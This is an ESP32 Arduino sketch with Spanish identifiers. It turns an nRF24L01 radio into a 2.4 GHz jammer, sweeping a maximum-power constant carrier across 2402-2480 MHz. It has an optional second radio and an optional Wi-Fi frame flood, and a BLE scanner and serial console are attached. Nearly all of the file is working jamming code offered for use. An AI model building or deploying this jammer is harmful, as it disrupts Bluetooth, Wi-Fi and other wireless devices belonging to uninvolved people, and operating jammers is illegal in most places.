#include <SPI.h>
#include "RF24.h"
#include <esp_bt.h>
#include <esp_wifi.h>

#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#define PIN_BOTON 33
#define PIN_LED   2

#define RADIO2_PINS   0
#define WIFI_JAM      0
#define CH_SWEEP_LOW  2
#define CH_SWEEP_HIGH 80
#define PLL_DWELL_US  150

SPIClass *spiBus = nullptr;
RF24 radio(22, 21, 16000000);

#if RADIO2_PINS
SPIClass *spiBus2 = nullptr;
RF24 *radio2 = nullptr;
#endif

bool jamming  = false;
bool scanning = false;
byte hopIdx   = 0;

BLEScan *pBLEScan = nullptr;

class ScanCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (!scanning || jamming) return;
    String nombre = dev.haveName() ? String(dev.getName().c_str()) : String("");
    Serial.print("DEV ");
    Serial.print(dev.getAddress().toString().c_str());
    Serial.print(" ");
    Serial.print(dev.getRSSI());
    Serial.print(" ");
    Serial.println(nombre);
  }
};

void configurarRadio() {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(3);
}

void emitirEstado() {
  Serial.print("MODE ");
  if (jamming)      Serial.println("JAM");
  else if (scanning) Serial.println("SCAN");
  else               Serial.println("IDLE");
}

void startScan() {
  if (jamming) return;
  scanning = true;
  Serial.println("OK SCAN ON");
  emitirEstado();
}

void stopScan() {
  scanning = false;
  Serial.println("OK SCAN OFF");
  emitirEstado();
}

void startJam() {
  scanning = false;
  if (pBLEScan) pBLEScan->stop();
  configurarRadio();
  radio.startConstCarrier(RF24_PA_MAX, CH_SWEEP_LOW);
  hopIdx  = CH_SWEEP_LOW;
  
#if RADIO2_PINS
  spiBus2 = new SPIClass(HSPI);
  spiBus2->begin(14, 12, 13, 27);
  radio2 = new RF24(26, 27, 16000000);
  if (radio2->begin(*spiBus2)) {
    configurarRadio2();
    radio2->startConstCarrier(RF24_PA_MAX, CH_SWEEP_HIGH);
  } else {
    Serial.println("AVISO: 2º nRF24 no responde, continuando con 1 radio");
    delete radio2;
    radio2 = nullptr;
    delete spiBus2;
    spiBus2 = nullptr;
  }
#endif

  jamming = true;
  digitalWrite(PIN_LED, HIGH);
  
#if RADIO2_PINS
  if (radio2) {
    Serial.print("OK JAM ON (barrido ");
    Serial.print(2400 + CH_SWEEP_LOW);
    Serial.print("-");
    Serial.print(2400 + CH_SWEEP_HIGH);
    Serial.println(" MHz, 2 radios)");
  } else {
#endif
    Serial.print("OK JAM ON (barrido ");
    Serial.print(2400 + CH_SWEEP_LOW);
    Serial.print("-");
    Serial.print(2400 + CH_SWEEP_HIGH);
    Serial.println(" MHz, 1 radio)");
#if RADIO2_PINS
  }
#endif

#if WIFI_JAM
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
#endif
  
  emitirEstado();
}

void configurarRadio2() {
  radio2->setAutoAck(false);
  radio2->stopListening();
  radio2->setRetries(0, 0);
  radio2->setPALevel(RF24_PA_MAX, true);
  radio2->setDataRate(RF24_2MBPS);
  radio2->setCRCLength(RF24_CRC_DISABLED);
  radio2->setAddressWidth(3);
}

void stopJam() {
  radio.powerDown();
  
#if RADIO2_PINS
  if (radio2) {
    radio2->powerDown();
    delete radio2;
    radio2 = nullptr;
  }
  if (spiBus2) {
    delete spiBus2;
    spiBus2 = nullptr;
  }
#endif

#if WIFI_JAM
  esp_wifi_set_promiscuous(false);
#endif

  jamming = false;
  digitalWrite(PIN_LED, LOW);
  Serial.println("OK JAM OFF");
  emitirEstado();
}

void procesarComando(String cmd) {
  cmd.trim();
  String c = cmd;
  c.toUpperCase();
  if      (c == "J" || c == "JAM")     startJam();
  else if (c == "X" || c == "STOP")    { stopJam(); stopScan(); }
  else if (c == "SCAN")                startScan();
  else if (c == "NOSCAN" || c == "SCANOFF") stopScan();
  else if (c == "S" || c == "STATUS")  emitirEstado();
  else if (c == "PING")                Serial.println("PONG");
  else if (c == "H" || c == "HELP")    Serial.println("CMDS: SCAN | NOSCAN | JAM | STOP | STATUS | PING");
  else if (c.length())                { Serial.print("ERR desconocido: "); Serial.println(cmd); }
}

void setup() {
  Serial.begin(115200);
  delay(300);

  pinMode(PIN_BOTON, INPUT_PULLUP);
  pinMode(PIN_LED, OUTPUT);
  digitalWrite(PIN_LED, LOW);

  spiBus = new SPIClass(VSPI);
  spiBus->begin();

  if (!radio.begin(spiBus)) {
    Serial.println("ERR nRF24 no responde (cableado/alimentacion)");
    while (true) {}
  }

  BLEDevice::init("rf_console");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new ScanCB());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);

  Serial.println("READY rf_console");
  emitirEstado();
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    procesarComando(cmd);
  }

  static bool botonPrevio = HIGH;
  bool ahora = digitalRead(PIN_BOTON);
  if (ahora != botonPrevio) {
    delay(25);
    if (digitalRead(PIN_BOTON) != ahora) {
      if (jamming) stopJam(); else startJam();
    }
    botonPrevio = ahora;
  }

  if (jamming) {
    radio.setChannel(hopIdx);
    
#if RADIO2_PINS
    if (radio2) {
      byte ch2 = CH_SWEEP_HIGH - (hopIdx - CH_SWEEP_LOW);
      if (ch2 < CH_SWEEP_LOW) ch2 = CH_SWEEP_HIGH - (CH_SWEEP_LOW - ch2) + 1;
      radio2->setChannel(ch2);
    }
#endif

    delayMicroseconds(PLL_DWELL_US);
    
    hopIdx++;
    if (hopIdx > CH_SWEEP_HIGH) hopIdx = CH_SWEEP_LOW;
  }

  if (scanning && !jamming) {
    static unsigned long lastScan = 0;
    if (millis() - lastScan > 1500) {
      pBLEScan->start(1, false);
      pBLEScan->clearResults();
      Serial.println("SCANEND");
      lastScan = millis();
    }
  }

#if WIFI_JAM
  if (jamming) {
    static byte wifiChIdx = 0;
    static const byte wifiCh[3] = {1, 6, 11};
    esp_wifi_set_channel(wifiCh[wifiChIdx], WIFI_SECOND_CHAN_NONE);
    wifiChIdx = (wifiChIdx + 1) % 3;
    
    uint8_t buf[24] = {0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    esp_wifi_80211_tx(WIFI_IF_STA, (wifi_ieee80211_pkt_t*)buf, 24, false);
  }
#endif
}
